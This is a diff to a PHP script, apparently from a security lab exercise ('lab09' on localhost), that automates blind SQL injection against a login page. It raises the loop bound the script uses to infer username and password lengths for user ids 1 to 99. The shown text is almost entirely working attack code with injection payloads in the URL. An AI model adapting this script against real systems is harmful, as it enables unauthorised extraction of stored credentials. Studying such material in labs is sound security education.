@@ -24,7 +24,7 @@
 for($id = 1; $id <= 99; $id++){
 	print "\n";
 	$size = 0;
-	while ($size < 25)
+	while ($size < 40)
 	{
 		$url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%20$id%20and%20length(username)%20=%20$size--%20";
 		$result = file_get_contents($url);
@@ -61,7 +61,7 @@ for($id = 1; $id <= 99; $id++){
 
 
 	$sizepwd = 0;
-	while ($sizepwd < 25)
+	while ($sizepwd < 40)
 	{
 		$url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%20$id%20and%20length(password)%20=%20$sizepwd--%20";
 		$result = file_get_contents($url);
